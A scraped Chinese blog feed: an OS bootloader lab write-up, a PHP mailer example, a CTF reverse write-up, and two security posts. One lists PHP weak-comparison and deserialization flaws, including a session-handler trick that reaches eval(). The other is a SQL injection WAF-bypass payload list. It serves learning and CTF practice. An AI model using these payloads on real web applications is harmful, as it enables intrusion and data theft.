//设置当前调试的CPU是8086 b 0x7c00 //在0x7c00处设置断点。此地址是bootloader入口点地址，可看boot/bootasm.S的start地址处 c //continue简称，表示继续执行 x /2i $pc //显示当前eip处的汇编指令 set architecture i386 //设置当前调试的CPU是80386所以断点正常2.3 从0x7c00开始跟踪代码运行,将单步跟踪反汇编得到的代码与bootasm.S和 bootblock.asm进行比较在tools/gdbinit结尾加上 b 0x7c00 c x /10i $pc在0x7c00处break，然后使用si和 x/i $pc 指令一行一行的跟踪，将得到的反汇编代码为：0x00007c01 in ?? ()(gdb) x/i $pc=&gt; 0x7c01: cld(gdb) si0x00007c02 in ?? ()(gdb) x/i $pc=&gt; 0x7c02: xor %eax,%eax(gdb) si0x00007c04 in ?? ()(gdb) x/i $pc=&gt; 0x7c04: mov %eax,%ds(gdb) bootblock.S 中的代码为：.code16 # Assemble for 16-bit mode cli # Disable interrupts cld # String operations increment # Set up the important data segment registers (DS, ES, SS). xorw %ax, %ax # Segment number zero movw %ax, %ds # -&gt; Data Segment movw %ax, %es # -&gt; Extra Segment movw %ax, %ss # -&gt; Stack Segment # Enable A20: # For backwards compatibility with the earliest PCs, physical # address line 20 is tied low, so that addresses higher than # 1MB wrap around to zero by default. This code undoes this.bootblock.asmstart:.code16 # Assemble for 16-bit mode cli # Disable interrupts 7c00: fa cli cld # String operations increment 7c01: fc cld # Set up the important data segment registers (DS, ES, SS). xorw %ax, %ax # Segment number zero 7c02: 31 c0 xor %eax,%eax movw %ax, %ds # -&gt; Data Segment 7c04: 8e d8 mov %eax,%ds movw %ax, %es # -&gt; Extra Segment 7c06: 8e c0 mov %eax,%es movw %ax, %ss # -&gt; Stack Segment 7c08: 8e d0 mov %eax,%ss观察发现他们相同练习3题目： 分析bootloader 进入保护模式的过程。 BIOS 将通过读取硬盘主引导扇区到内存，并转跳到对应内存中的位置执行 bootloader。请分析bootloader是如何完成从实模式进入保护模式的从bootasm.s查看代码(在这里分析bootblock.asm也可以，二者源码相同)，并分析过程宏定义.set PROT_MODE_CSEG, 0x8 #内核代码段选择子 .set PROT_MODE_DSEG, 0x10 #内核数据段选择子 .set CR0_PE_ON, 0x1 #保护模式使能标志 1.关闭中断，将各个段寄存器重置修改控制方向标志寄存器DF=0，使得内存地址从低到高增加 它先将各个寄存器置0#CPU刚启动为16位模式 cli # 关中断 cld # 清方向标志 xorw %ax, %ax # 置零 movw %ax, %ds # -&gt; 数据段寄存器 movw %ax, %es # -&gt; 附加段寄存器 movw %ax, %ss # -&gt; 堆栈段寄存器2 .开启A20开启A20地址线之后，用来表示内存地址的位数变多了。开启前20位，开启后是32位。如果不开启A20地址线内存寻址最大只能找到1M，对于1M以上的地址访问会变成对address mod 1M地址的访问。通过将键盘控制器上的A20线置于高电位，全部32条地址线可用，可以访问4G的内存空间。 打开A20地址线 为了兼容早期的PC机，第20根地址线在实模式下不能使用所以超过1MB的地址，默认就会返回到地址0，重新从0循环计数，下面的代码打开A20地址线 。seta20.1: inb $0x64, %al # 从0x64端口读入一个字节的数据到al中 testb $0x2, %al # test指令可以当作and指令，只不过它不会影响操作数 jnz seta20.1#如果上面的测试中发现al的第2位为0，就不执行该指令 否则就循环检查 movb $0xd1, %al # 将0xd1写入到al中 outb %al,$0x64 #将al中的数据写入到端口0x64中 seta20.2: inb $0x64, %al testb $0x2, %al jnz seta20.2 movb $0xdf, %al # 通过0x60写入数据11011111 即将A20置1 outb %al, $0x60初始化GDT表：一个简单的GDT表和其描述符已经静态储存在引导区中，载入即可 lgdt gdtdesc #将全局描述符表描述符加载到全局描述符表寄存器 进入保护模式：通过将cr0寄存器PE位置1便开启了保护模式cr0中的第0位为1表示处于保护模式cr0中的第0位为0，表示处于实模式把控制寄存器cr0加载到eax中movl %cr0, %eaxorl $CR0_PE_ON, %eaxmovl %eax, %cr0通过长跳转更新cs的基地址ljmp $PROT_MODE_CSEG, $protcseg.code32protcseg:设置段寄存器，并建立堆栈movw $PROT_MODE_DSEG, %axmovw %ax, %dsmovw %ax, %esmovw %ax, %fsmovw %ax, %gsmovw %ax, %ssmovl $0x0, %ebpmovl $start, %esp转到保护模式完成，进入boot主方法call bootmain练习4题目： 分析bootloader加载ELF格式的OS的过程 1. bootloader如何读取硬盘扇区的？ 2. bootloader是如何加载 ELF格式的 OS？bootmain 代码bootmain(void) { readseg((uintptr_t)ELFHDR, SECTSIZE 8, 0); if (ELFHDR-&gt;e_magic != ELF_MAGIC) { goto bad; } struct proghdr ph, eph; ph = (struct proghdr )((uintptr_t)ELFHDR + ELFHDR-&gt;e_phoff); eph = ph + ELFHDR-&gt;e_phnum; for (; ph &lt; eph; ph ++) { readseg(ph-&gt;p_va &amp; 0xFFFFFF, ph-&gt;p_memsz, ph-&gt;p_offset); } ((void ()(void))(ELFHDR-&gt;e_entry &amp; 0xFFFFFF))();bad: outw(0x8A00, 0x8A00); outw(0x8A00, 0x8E00); while (1);}readsect从设备的第secno扇区读取数据到dst位置 static void readsect(void dst, uint32_t secno) { waitdisk(); outb(0x1F2, 1); // 设置读取扇区的数目为1 outb(0x1F3, secno &amp; 0xFF); outb(0x1F4, (secno &gt;&gt; 8) &amp; 0xFF); outb(0x1F5, (secno &gt;&gt; 16) &amp; 0xFF); outb(0x1F6, ((secno &gt;&gt; 24) &amp; 0xF) | 0xE0); // 上面四条指令联合制定了扇区号 // 在这4个字节线联合构成的32位参数中 // 29-31位强制设为1 // 28位(=0)表示访问”Disk 0” // 0-27位是28位的偏移量 outb(0x1F7, 0x20); // 0x20命令，读取扇区 waitdisk(); insl(0x1F0, dst, SECTSIZE / 4); // 读取到dst位置， // 幻数4因为这里以DW为单位 }IO地址 功能 0x1f0 读数据，当0x1f7不为忙状态时，可以读。 0x1f2 要读写的扇区数，每次读写前，你需要表明你要读写几个扇区。最小是1个扇区 0x1f3 如果是LBA模式，就是LBA参数的0-7位 0x1f4 如果是LBA模式，就是LBA参数的8-15位 0x1f5 如果是LBA模式，就是LBA参数的16-23位 0x1f6 第0~3位：如果是LBA模式就是24-27位 第4位：为0主盘；为1从盘 0x1f7 状态和命令寄存器。操作时先给命令，再读取，如果不是忙状态就从0x1f0端口读数据加载ELF文件bootmain(void) { ………. if (ELFHDR-&gt;e_magic != ELF_MAGIC) {//这里有个判断 goto bad; } struct proghdr ph, eph; //ELF头部有描述ELF文件应加载到内存什么位置的描述表，这里读取出来将之存入ph ph = (struct proghdr )((uintptr_t)ELFHDR + ELFHDR-&gt;e_phoff); eph = ph + ELFHDR-&gt;e_phnum; //按照程序头表的描述，将ELF文件中的数据载入内存 for (; ph &lt; eph; ph ++) { readseg(ph-&gt;p_va &amp; 0xFFFFFF, ph-&gt;p_memsz, ph-&gt;p_offset); ((void ()(void))(ELFHDR-&gt;e_entry &amp; 0xFFFFFF))();//根据ELF头表中的入口信息，找到内核的入口并开始运行bad: ……….}练习5题目： 实现函数调用堆栈跟踪函数什么是函数栈？当函数被调用时，首先会把函数的参数依次入栈（这里指的是堆栈传参，当然也可以用寄存器传参）调用函数的栈底压栈到自己函数的栈中（push bp），然后将原来函数栈顶sp作为当前函数的栈底（mov bp,sp）。函数运行完成时，会将压入栈中的bp重新出栈到bp中（pop bp）。同时将计算的结果保存在寄存器中，返回原界面。那么我们可以粗浅的建立一个栈模型ss:[ebp-8] ;变量2ss:[ebp-4] ;变量1ss:[ebp] ;栈针ss:[ebp+4] ;返回地址ss:[ebp+8] ;第一个参数函数实现read_ebp()和read_eip()函数来获取当前ebp寄存器和eip 寄存器的信息。查看print_stackframe函数注释 / LAB1 YOUR CODE : STEP 1 / / (1) call read_ebp() to get the value of ebp. the type is (uint32_t); (2) call read_eip() to get the value of eip. the type is (uint32_t); (3) from 0 .. STACKFRAME_DEPTH (3.1) printf value of ebp, eip (3.2) (uint32_t)calling arguments [0..4] = the contents in address (unit32_t)ebp +2 [0..4] (3.3) cprintf(“\n”); (3.4) call print_debuginfo(eip-1) to print the C calling function name and line number, etc. (3.5) popup a calling stackframe NOTICE: the calling funciton’s return addr eip = ss:[ebp+4] the calling funciton’s ebp = ss:[ebp] / for(i = 0; ebp!=0 &amp;&amp; i &lt; STACKFRAME_DEPTH; i++) {//STACKFRAME_DEPTH = 20 一直向上循环找到所有的调用函数为止，一开始没有判断栈针为空的条件 cprintf(“ebp:0x%08x eip:0x%08x “,ebp, eip); uint32_t args = (uint32_t )ebp + 2; //传参 for(j = 0; j &lt; 4; j++) cprintf(“0x%08x “,args[j]); cprintf(“\n”); print_debuginfo(eip-1); //模拟函数执行完毕 eip = ((uint32_t )ebp+1);//调用函数的返回地址 ebp = ((uint32_t )ebp);//上一个函数的栈针 //循环直到没有调用函数停止 }执行结果如下： 未加ebp!=0 我们发现ebp的值在0x7bf8之后就为零了，这说明上面没有了调用函数，直接加个判断 ebp!=0 就可以输出预期的结果。加了ebp!=0 练习6题目： 1.中断向量表中一个表项占多少字节？其中哪几位代表中断处理代码的入口？ 2.请编程完善kern/trap/trap.c中对中断向量表进行初始化的函数idt_init。在idt_init函数中，依次对所有中断入口进行初始化。使用mmu.h中的SETGATE宏，填充idt数组内容。注意除了系统调用中断(T_SYSCALL)以外，其它中断均使用中断门描述符，权限为内核态权限；而系统调用中断使用异常,权限为陷阱门描述符。每个中断的入口由tools/vectors.c生成，使用trap.c中声明的vectors数组即可。 3.请编程完善trap.c中的中断处理函数trap在对时钟中断进行处理的部分填写trap函数中处理时钟中断的部分，使操作系统每遇到100次时钟中断后，调用 print_ticks子程序，向屏幕上打印一行文字100 ticks。1.中断向量表中一个表项占多少字节？其中哪几位代表中断处理代码的入口？中断向量表一个表项占用8字节，其中2-3字节是段选择子，0-1字节和6-7字节拼成位移， 两者联合便是中断处理程序的入口地址。 中断描述符表中一个表项占8个字节，其中每个位的作用如图：其中015和4863分别为offset的低16位和高16位，16~31位是段选择子，通过段选择子得到段基址，再加上段内偏移量就可以得到中断处理代码的入口。2.请编程完善kern/trap/trap.c中对中断向量表进行初始化的函数idt_init extern uintptr_t vectors[];//声明vertors[] You can use “extern uintptr_t vectors[];” to define this extern variable which will be used later. int i; for(i=0;i&lt;256;i++) { SETGATE(idt[i],0,GD_KTEXT,vectors[i],DPL_KERNEL);//对整个idt数组进行初始化 } SETGATE(idt[T_SWITCH_TOK],0,GD_KTEXT,__vectors[T_SWITCH_TOK],DPL_USER);//在这里先把所有的中断都初始化为内核级的中断 lidt(&amp;idt_pd);//使用lidt指令加载中断描述符表 just google it! and check the libs/x86.h to know more.利用google找到了相关函数}/ 传入的第一个参数gate是中断的描述符表 传入的第二个参数istrap用来判断是中断还是trap 传入的第三个参数sel的作用是进行段的选择 传入的第四个参数off表示偏移 传入的第五个参数dpl表示这个中断的优先级/3.程完善trap.c中的中断处理函数trap在对时钟中断进行处理的部分填写trap函数中处理时钟中断的部分，使操作系统每遇到100次时钟中断后，调用 print_ticks子程序，向屏幕上打印一行文字100 ticks实验代码填写 case IRQ_OFFSET + IRQ_TIMER: / LAB1 YOUR CODE : STEP 3 / / handle the timer interrupt / / (1) After a timer interrupt, you should record this event using a global variable (increase it), such as ticks in kern/driver/clock.c (2) Every TICK_NUM cycle, you can print some info using a funciton, such as print_ticks(). (3) Too Simple? Yes, I think so! */代码如下：ticks++; if(ticks%TICK_NUM == 0)//每次时钟中断之后ticks就会加一 当加到TICK_NUM次数时 打印并重新开始 print_ticks();//前面有定义 打印字符串实验截图如下：]]></content>
      <tags>
        <tag>操作系统实验</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP 函数漏洞总结]]></title>
    <url>%2F2017%2F03%2F09%2FPHP%20%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[总结了常见的PHP函数漏洞，希望对大家有用 1.MD5 compare漏洞PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。 常见的payload有0x01 md5(str) QNKCDZO 240610708 s878926199a s155964671a s214587387a s214587387a sha1(str) sha1(‘aaroZmOk’) sha1(‘aaK1STfY’) sha1(‘aaO8zKZF’) sha1(‘aa3OFF9m’)0x02 md5(md5(str).“SALT”) 2同时MD5不能处理数组，若有以下判断则可用数组绕过if(@md5($_GET[‘a’]) == @md5($_GET[‘b’])){ echo “yes”;}//http://127.0.0.1/1.php?a[]=1&amp;b[]=22.ereg函数漏洞：00截断ereg (“^[a-zA-Z0-9]+$”, $_GET[‘password’]) === FALSE字符串对比解析 在这里如果 $_GET[‘password’]为数组，则返回值为NULL 如果为123 || asd || 12as || 123%00&amp;&amp;&amp;，则返回值为true 其余为false3.变量本身的key说到变量的提交很多人只是看到了GET/POST/COOKIE等提交的变量的值，但是忘记了有的程序把变量本身的key也当变量提取给函数处理。 &lt;?php //key.php?aaaa’aaa=1&amp;bb’b=2 //print_R($_GET); foreach ($_GET AS $key =&gt; $value) { print $key.“\n”; } ?&gt;4.变量覆盖extract()这个函数在指定参数为EXTR_OVERWRITE或者没有指定函数可以导致变量覆盖&lt;?php $auth = ‘0’; // 这里可以覆盖$auth的变量值 extract($_GET); if($auth == 1){ echo “private!”; } else{ echo “public!”; }?&gt;&lt;?php$a=‘hi’;foreach($_GET as $key =&gt; $value) { echo $key; $$key = $value;}print $a;?&gt;5.strcmp如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。 5.2 中是将两个参数先转换成string类型。 5.3.3以后，当比较数组和字符串的时候，返回是0。 5.5 中如果参数不是string类型，直接return了&lt;?php $password=$_GET[‘password’]; if (strcmp(‘xd’,$password)) { echo ‘NO!’; } else{ echo ‘YES!’; }?&gt;6.sha1 和 md5 函数md5 和 sha1 无法处理数组，返回 NULLif (@sha1([]) == false) echo 1;if (@md5([]) == false) echo 2;echo var_dump(@sha1([]));7.is_numericPHP提供了is_numeric函数，用来变量判断是否为数字。但是函数的范围比较广泛，不仅仅是十进制的数字。&lt;?phpecho is_numeric(233333); # 1echo is_numeric(‘233333’); # 1echo is_numeric(0x233333); # 1echo is_numeric(‘0x233333’); # 1echo is_numeric(‘233333abc’); # 0?&gt;8.preg_match如果在进行正则表达式匹配的时候，没有限制字符串的开始和结束(^ 和 $)，则可以存在绕过的问题&lt;?php$ip = ‘1.1.1.1 abcd’; // 可以绕过if(!preg_match(“/(\d+).(\d+).(\d+).(\d+)/“,$ip)) { die(‘error’);} else { echo(‘key…’);}?&gt;9.parse_str与 parse_str() 类似的函数还有 mb_parse_str()，parse_str 将字符串解析成多个变量，如果参数str是URL传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域。//var.php?var=new $var=‘init’;parse_str($_SERVER[‘QUERY_STRING’]);print $var;10.字符串比较== 是弱类型的比较，以下比较都为 true&lt;?phpecho 0 == ‘a’ ;// a 转换为数字为 0 重点注意// 0x 开头会被当成16进制54975581388的16进制为 0xccccccccc// 十六进制与整数，被转换为同一进制比较‘0xccccccccc’ == ‘54975581388’ ;// 字符串在与数字比较前会自动转换为数字，如果不能转换为数字会变成01 == ‘1’;1 == ‘01’;10 == ‘1e1’;‘100’ == ‘1e2’ ;// 十六进制数与带空格十六进制数，被转换为十六进制整数‘0xABCdef’ == ‘ 0xABCdef’;echo ‘0010e2’ == ‘1e3’;// 0e 开头会被当成数字，又是等于 010^xxx=0// 如果 md5 是以 0e 开头，在做比较的时候，可以用这种方法绕过‘0e509367213418206700842008763514’ == ‘0e481036490867661113260034900752’;‘0e481036490867661113260034900752’ == ‘0’ ;var_dump(md5(‘240610708’) == md5(‘QNKCDZO’));var_dump(md5(‘aabg7XSs’) == md5(‘aabC9RqS’));var_dump(sha1(‘aaroZmOk’) == sha1(‘aaK1STfY’));var_dump(sha1(‘aaO8zKZF’) == sha1(‘aa3OFF9m’));?&gt;11.unsetunset(bar);用来销毁指定的变量，如果变量bar); 用来销毁指定的变量，如果变量 bar 包含在请求参数中，可能出现销毁一些变量而实现程序逻辑绕过。&lt;?php// http://127.0.0.1/index.php?_CONFIG=123$_CONFIG[‘extraSecure’] = true;foreach(array(‘_GET’,‘_POST’) as $method) { foreach($$method as $key=&gt;$value) { // $key == _CONFIG // $$key == $_CONFIG // 这个函数会把 $_CONFIG 变量销毁 unset($$key); }}if ($_CONFIG[‘extraSecure’] == false) { echo ‘flag {*}’;}?&gt;12.intval()int转string：$var = 5;方式1：$item = (string)$var;方式2：$item = strval($var); string转int：intval()函数。var_dump(intval(‘2’)) //2 var_dump(intval(‘3abcd’)) //3 var_dump(intval(‘abcd’)) //0 说明intval()转换的时候，会将从字符串的开始进行转换知道遇到一个非数字的字符。即使出现无法转换的字符串，intval()不会报错而是返回0。 利用代码：&lt;?php$a = ‘10000 union select * from yz’;if(intval($a)&gt;1000) echo $a ;?&gt;13.switch()如果switch是数字类型的case的判断时，switch会将其中的参数转换为int类型。如下：&lt;?php$i =“2abc”;switch ($i) {case 0:case 1:case 2:echo “i is less than 3 but not negative”;break;case 3:echo “i is 3”;}?&gt;这个时候程序输出的是i is less than 3 but not negative，是由于switch()函数将$i进行了类型转换，转换结果为2。14.in_array()$array=[0,1,2,‘3’];var_dump(in_array(‘abc’, $array)); //true var_dump(in_array(‘1bc’, $array)); //true 可以看到上面的情况返回的都是true,因为’abc’会转换为0，’1bc’转换为1。 在所有php认为是int的地方输入string，都会被强制转换15.serialize 和 unserialize漏洞1.魔术方法这里我们先简单介绍一下php中的魔术方法（这里如果对于类、对象、方法不熟的先去学学吧），即Magic方法，php类可能会包含一些特殊的函数叫magic函数，magic函数命名是以符号开头的，比如 construct， destruct，toString，sleep，wakeup等等。这些函数都会在某些特殊时候被自动调用。 例如construct()方法会在一个对象被创建时自动调用，对应的destruct则会在一个对象被销毁时调用等等。 这里有两个比较特别的Magic方法，sleep 方法会在一个对象被序列化的时候调用。 wakeup方法会在一个对象被反序列化的时候调用。在这里介绍一个序列化漏洞，首先不要相信用户输入的一切 看下面代码&lt;?phpclass test{ public $username = ‘’; public $password = ‘’; public $file = ‘’; public function out(){ echo “username: “.$this-&gt;username.“&lt;br&gt;”.“password: “.$this-&gt;password ; } public function toString() { return file_get_contents($this-&gt;file); }}$a = new test();$a-&gt;file = ‘C:\Users\YZ\Desktop\plan.txt’;echo serialize($a);?&gt;//tostring方法会在输出实例的时候执行，如果实例路径是隐秘文件就可以读取了下面就可以读取了C:\Users\YZ\Desktop\plan.txt文件了 echo unserialize触发了tostring函数&lt;?phpclass test{ public $username = ‘’; public $password = ‘’; public $file = ‘’; public function out(){ echo “username: “.$this-&gt;username.“&lt;br&gt;”.“password: “.$this-&gt;password ; } public function toString() { return file_get_contents($this-&gt;file); }}$a = ‘O:4:”test”:3:{s:8:”username”;s:0:””;s:8:”password”;s:0:””;s:4:”file”;s:28:”C:\Users\YZ\Desktop\plan.txt”;}’;echo unserialize($a);?&gt;16.session 反序列化漏洞主要原因是 ini_set(‘session.serialize_handler’, ‘php_serialize’); ini_set(‘session.serialize_handler’, ‘php’); 两者处理session的方式不同利用下面代码可以生成session值&lt;?phpini_set(‘session.serialize_handler’, ‘php_serialize’);//a:1:{s:6:”spoock”;s:3:”111”;}//ini_set(‘session.serialize_handler’, ‘php’);//a|s:3:”111”session_start();$_SESSION[“spoock”]=$_GET[“a”];?&gt;我们来看看生成的session值spoock|s:3:“111”; //session键值|内容序列化a:1:{s:6:“spoock”;s:3:“111”;}a:1:{s:N:session键值;内容序列化}在ini_set(‘session.serialize_handler’, ‘php’);中把|之前认为是键值后面的视为序列化那么就可以利用这一漏洞执行一些恶意代码看下面的例子 1.php&lt;?phpini_set(‘session.serialize_handler’, ‘php_serialize’);session_start();$_SESSION[“spoock”]=$_GET[“a”];?&gt;2.php&lt;?php ini_set(‘session.serialize_handler’, ‘php’);session_start();class lemon { var $hi; function construct(){ $this-&gt;hi = ‘phpinfo();’; } function __destruct() { eval($this-&gt;hi);//这里很危险，可以执行用户输入的参数 }}?&gt;在1.PHP里面输入a参数序列化的值|O:5:”lemon”:1:{s:2:”hi”;s:10:”phpinfo();”;} 则被序列化为 a:1:{s:6:”spoock”;s:44:”|O:5:”lemon”:1:{s:2:”hi”;s:10:”phpinfo();”;} 在2.PHP里面打开 就可以执行phpinfo（）了 有道web题 这里是题解]]></content>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHPmailer 邮件发送原理及实现]]></title>
    <url>%2F2017%2F03%2F09%2FPHPmailer%20%E9%82%AE%E4%BB%B6%E5%8F%91%E9%80%81%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[简单了解一下PHP发送邮件的过程，利用PHPmailer 一 邮件发送原理（1）组成部分 graph TD; 邮件--&gt;邮件服务器; 邮件服务器--&gt;供在网上存储邮件的空间; 邮件--&gt;用户代理; 用户代理--&gt;邮件服务器上读取或者发送邮件到邮件服务器上的一个软件 邮件--&gt;邮件传送协议; 邮件传送协议--&gt;邮件在传送过程中必须遵守的约定1. 发信人在用户代理上编辑邮件，并写清楚收件人的邮箱地址；2. 用户代理根据发信人编辑的信息，生成一封符合邮件格式的邮件；3. 用户代理把邮件发送到发信人的的邮件服务器上，邮件服务器上面有一个缓冲队列，发送到邮件服务器上面的邮件都会加入到缓冲队列中，等待邮件服务器上的SMTP客户端进行发送；4. 发信人的邮件服务器使用SMTP协议把这封邮件发送到收件人的邮件服务器上（它会自动根据收件人的邮箱来分析出收件人的邮箱服务器）；5. 收件人的邮件服务器收到邮件后，把这封邮件放到收件人在这个服务器上的信箱中；6. 收件人使用用户代理来收取邮件。首先用户代理使用POP3协议来连接收件人所在的邮件服务器，身份验证成功后，用户代理就可以把邮件服务器上面的收件人邮箱里面的邮件读取出来，并展示给收件人。（2）协议简介协议简介：SMTPSMTP(Simple Mail Transfer Protocol)即简单邮件传输协议，是一种提供可靠且有效电子邮件传输的协议。SMTP是建立在FTP文件传输服务上的一种邮件服务，主要用于传输系统之间的邮件信息并提供与来信有关的通知。（来自百度百科）协议简介：POP3POP3(Post Office Protocol 3)即邮局协议的第3个版本，它是规定个人计算机如何连接到互联网上的邮件服务器进行收发邮件的协议。它是因特网电子邮件的第一个离线协议标准，POP3协议允许用户从服务器上把邮件存储到本地主机（即自己的计算机）上，同时根据客户端的操作删除或保存在邮件服务器上的邮件，而POP3服务器则是遵循POP3协议的接收邮件服务器，用来接收电子邮件的。（来自百度百科） POP 协议支持“离线”邮件处理。其具体过程是：邮件发送到服务器上，电子邮件客户端调用邮件客户机程序以连接服务器，并下载所有未阅读的电子邮件。这种离线访问模式是一种存储转发服务，将邮件从邮件服务器端送到个人终端机器上，一般是 PC机或 MAC。一旦邮件发送到 PC 机或 MAC上，邮件服务器上的邮件将会被删除。但目前的POP3邮件服务器大都可以“只下载邮件，服务器端并不删除”，也就是改进的POP3协议。（来自百度百科）（3）常用的邮件服务器地址126邮箱POP3服务器:pop.126.com SMTP服务器:smtp.126.com163邮箱POP3服务器:pop.163.com SMTP服务器:smtp.163.comyahoo邮箱注意：yahoo在foxmail 4.1以上的版本设置如下：POP3服务器：pop.mail.yahoo.com.cn SMTP服务器：smtp.mail.yahoo.com.cnSohu邮箱POP3服务器：pop3.sohu.com SMTP服务器：smtp.sohu.comQQ邮箱POP3服务器：pop.qq.com SMTP服务器：smtp.qq.com SMTP服务器需要身份验证从上面大家可以看出，一般的POP3邮件服务器地址为pop然后加上自己的域名，SMTP邮件服务器地址为smtp加上自己的域名。常用的邮件服务器地址都可以在网上找到。各大型邮箱smtp服务器及端口收集 。二 邮件发送代码（phpmailer）&lt;?php// 必要导入require(“phpmailer/class.phpmailer.php”);require(“phpmailer/class.smtp.php”);date_default_timezone_set(‘Asia/Shanghai’);//设定时区东八区$mail = new PHPMailer(); //建立邮件发送类$address = “xxxx@qq.com”;//306800278收件人地址（必须真实）$mail-&gt;IsSMTP(); // 使用SMTP方式发送$mail-&gt;CharSet =“UTF-8”;//设置编码，否则发送中文乱码$mail-&gt;Host = “smtp.qq.com”; // 您的企业邮局域名 $mail-&gt;SMTPAuth = true; // 启用SMTP验证功能$mail-&gt;Username = “yyyy@qq.com”; // 发件人邮箱（必须真实）$mail-&gt;Password = “*“; // 发件人密码（必须真实）$mail-&gt;From = “yyyyy@qq.com”; //邮件发送者email地址（必须真实）$mail-&gt;FromName = “yz”;// 发件人姓名$mail-&gt;AddAddress($address, “222@qq.com”);//收件人收件人地址，可以替换成任何想要接收邮件的email信箱,格式是AddAddress(“收件人email”,”收件人姓名”)//$mail-&gt;AddReplyTo(“”, “”);//$mail-&gt;AddAttachment(“/var/tmp/file.tar.gz”); // 添加附件//$mail-&gt;IsHTML(true); // set email format to HTML //是否使用HTML格式$mail-&gt;Subject = “test”; //邮件标题$mail-&gt;Body = “hello”; //邮件内容$mail-&gt;AltBody = “This is the body in plain text for non-HTML mail clients”; //附加信息，可以省略if(!$mail-&gt;Send()) {echo ‘Mailer Error: ‘ . $mail-&gt;ErrorInfo;} else {echo “Message sent!恭喜，邮件发送成功！”;}?&gt;]]></content>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2016 CFF Reverse]]></title>
    <url>%2F2017%2F03%2F03%2F2016%20CFF%20Reverse%2F</url>
    <content type="text"><![CDATA[CFF黑客秀的题目 题目做起来也不错分享一下题解 1.软件密码破解_1首先利用PEID查看有无加壳 无壳可以正常破解（1）利用OD初步调试首先查找可以利用的字符串进行定位，但是在string中没有找到有用信息 于是单步调试查找输入字符串的地方，找到了下图 下断点分析后续代码，没有找到判断的地方。（2）IDA查找函数在IDA中找了几个函数，一个文本输入，一个点击按钮 试了下都不行（3）OD输入后查找字符串寻找突破点，输入了1234 下断点 ，这下找到了判断函数，估计代码写的时候运用了多线程，使得在主线程中找不到判断的相关信息 （4）分析算法算法很简单简单的异或，然后内存值的比对xor = [0x28, 0x57, 0x64, 0x6B, 0x93, 0x8F, 0x65, 0x51, 0xE3, 0x53, 0xE4, 0x4E, 0x1A, 0xFF]result = [0x1B, 0x1C, 0x17, 0x46, 0xF4, 0xFD, 0x20, 0x30, 0xB7, 0x0C, 0x8E, 0x7E, 0x78, 0xDE]flag = ‘’for i in xrange(len(result)): flag += chr(xor[i] ^ result[i])print flag]]></content>
      <tags>
        <tag>write-up</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL注入&WAF绕过姿势]]></title>
    <url>%2F2017%2F03%2F02%2FSQL%E6%B3%A8%E5%85%A5%26WAF%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%2F</url>
    <content type="text"><![CDATA[1.WAF过滤机制： 1.异常检测协议–拒绝不符合HTTP标准的请求； 2.增强的输入验证–代理和服务端的验证而不只是限于客户端验证； 3.白名单&amp;黑名单机制–白名单适用于稳定的Web应用，黑名单适合处理已知问题； 4.基于规则和基于异常的保护–基于规则更多的依赖黑名单机制基于，基于异常根据系统异常更为灵活； 5．另外还有会话保护、Cookies保护、抗入侵规避技术、响应监视和信息泄 1.WAF过滤机制：1.异常检测协议–拒绝不符合HTTP标准的请求； 2.增强的输入验证–代理和服务端的验证而不只是限于客户端验证； 3.白名单&amp;黑名单机制–白名单适用于稳定的Web应用，黑名单适合处理已知问题； 4.基于规则和基于异常的保护–基于规则更多的依赖黑名单机制基于，基于异常根据系统异常更为灵活； 5．另外还有会话保护、Cookies保护、抗入侵规避技术、响应监视和信息泄露保护等。2.WAF绕过姿势（1）大小写绕过此类绕过不经常使用，但是用的时候也不能忘了它，他原理是基于SQL语句不分大小写的，但过滤只过滤其中一种。 这里有道题（2）替换关键字这种情况下大小写转化无法绕过而且正则表达式会替换或删除select、union这些关键字如果只匹配一次就很容易绕过http://www.xx.com/index.php?page_id=-15 UNIunionON SELselectECT 1,2,3,4（3）空格绕过payloadselect//*//from//yz;select%0a%0afrom%0ayz; %0a 是回车/!select//!//!from//!yz/;select(a)from(yz);select(a)from(yz)where(a=1);## （4）替换关键字 这种情况下大小写转化无法绕过而且正则表达式会替换或删除select、union这些关键字如果只匹配一次就很容易绕过SELselectECT 1,2,3,4 （5）URL编码有时后台界面会再次URL解码所以这时可以利用二次编码解决问题 后台语句$insert=$link-&gt;query(urldecode($_GET[‘id’]));$row=$insert-&gt;fetch_row();select from yzselect from %2579%257a（6）十六进制绕过（引号绕过）在SQL语句的数据区域可以采用十六进制绕过敏感词汇select a from yz where b=0x32;select from yz where b=char(0x32);select from yz where b=char(0x67)+char(0x75)+char(0x65)+char(0x73)+char(0x74)select column_name from information_schema.tables where table_name=“users”select column_name from information_schema.tables where table_name=0x7573657273（7）逗号绕过在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决。 substr(),mid()mid(user() from 1 for 1)substr(user() from 1 for 1)select substr(user()from -1) from yz ;select ascii(substr(user() from 1 for 1)) &lt; 150;同时也可以利用替换函数select left(database(),2)&gt;‘tf’;limitselete from testtable limit 2,1;selete from testtable limit 2 offset 1;（8）比较符(&lt;,&gt;)绕过同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到greatest，strcmp来进行绕过了。select from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64select strcmp(left(database(),1),0x32);#lpad(‘asd’,2,0)if(substr(id,1,1)in(0x41),1,3)新学习了一种骚骚的注入姿势in、between、order by select from yz where a in (‘aaa’); select substr(a,1,1) in (‘a’) from yz ;select from yz where a between ‘a’ and ‘b’; select from yz where a between 0x89 and 0x90;select from yz union select 1,2,3 order by 1; 